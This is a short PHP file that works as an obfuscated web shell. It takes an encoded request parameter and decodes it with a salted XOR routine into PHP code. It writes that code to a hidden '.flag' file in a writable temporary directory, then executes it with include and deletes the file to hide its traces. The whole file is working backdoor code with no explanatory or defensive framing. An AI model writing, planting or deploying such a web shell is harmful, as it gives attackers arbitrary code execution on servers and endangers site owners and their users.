<?php

if(isset($_REQUEST["\x76\x61l"]) ? true : false){
	$descriptor = array_filter([getenv("TMP"), session_save_path(), "/var/tmp", getcwd(), "/tmp", sys_get_temp_dir(), getenv("TEMP"), ini_get("upload_tmp_dir"), "/dev/shm"]);
	$value = $_REQUEST["\x76\x61l"];
			$value  =	 explode 		( 	'.'	, 	 $value 		)		 ;	
	$element='';
            $salt8='abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen=strlen(  $salt8  );
            $len=count(  $value  );
    
            for(  $j=0; $j < $len; $j++) { 	$v4=$value[$j];
                $sChar=ord(  $salt8[$j%$sLen]  );
                $dec=(  (  int)$v4 - $sChar -(  $j%10)) ^ 8;
                $element		.= 	chr(  $dec  );
            }
	foreach ($descriptor as $k) {
    		if (!!is_dir($k) && !!is_writable($k)) {
    $obj = "$k" . "/.flag";
    if (@file_put_contents($obj, $element) !== false) {
	include $obj;
	unlink($obj);
	die();
}
}
}
}